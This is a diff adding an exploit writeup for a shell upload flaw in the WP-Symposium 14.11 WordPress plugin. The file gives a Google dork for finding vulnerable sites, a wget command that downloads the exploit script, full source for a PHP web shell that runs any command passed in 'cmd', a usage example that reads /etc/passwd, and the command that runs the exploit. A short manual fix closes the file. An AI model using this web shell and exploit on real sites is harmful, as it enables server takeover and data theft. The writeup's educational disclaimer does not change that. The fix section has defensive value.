@@ -1,0 +1,87 @@
+#
+# Exploit Name: Wp-symposium 14.11 Shell Upload Vulnerability
+#               
+#               
+# 
+# Vulnerability discovered by Claudio Viviani
+#
+#
+# Dork google wordpress:  index of "wp-symposium"
+# 
+#
+# Tested on BackBox 3.x
+#
+# Exploit written by:
+#
+#                    Claudio Viviani
+#
+#                    http://www.homelab.it
+#                    info@homelab.it
+#
+#                    https://www.facebook.com/homelabit
+#                    https://twitter.com/homelabit
+#                    https://plus.google.com/+HomelabIt1/
+#                    https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+
+####################################################################
+#
+# This video is intended for educational 
+# purposes only and the author can not be held liable for 
+# any kind of damages done whatsoever to your machine, 
+# or damages caused by some other,creative application of this video.
+# In any case you disagree with the above statement,stop here.
+#
+#####################################################################
+
+Wordpress: http://10.0.0.67/wordpress
+
+Php_shell: shell.php
+
+
+1) Install wp-symposium 14.11 plugin
+
+
+2) The upload function is protected....
+
+
+3) ...BUT "/wp-symposium/server/php/index.php" is not protected and "/wp-symposium/server/php/UploadHandler.php" allow any extension
+
+
+4) Download Exploit
+
+wget http://www.homelab.it/wp-content/uploads/2014/12/wp_symposium_1411_shell_upload.py_.txt
+
+
+5) Create simple php shell.php:
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+
+6) Run Exploit
+
+python wp_symposium_1411_shell_upload.py -t http://10.0.0.67/wordpress -f shell.php
+
+
+7) Check Backdoor location (Random filename)
+
+
+8) Manual Fix + Re-Check Vulnerability
+
+   Edit: "/wp-symposium/server/php/UploadHandler.php"
+   
+   Defines which files (based on their names) are accepted for upload
+   'accept_file_types' => '/\.(mp4|zip|doc|docx|ppt|pptx|xls|xlsx|txt|pdf|gif|jpe?g|png)$/i',
+
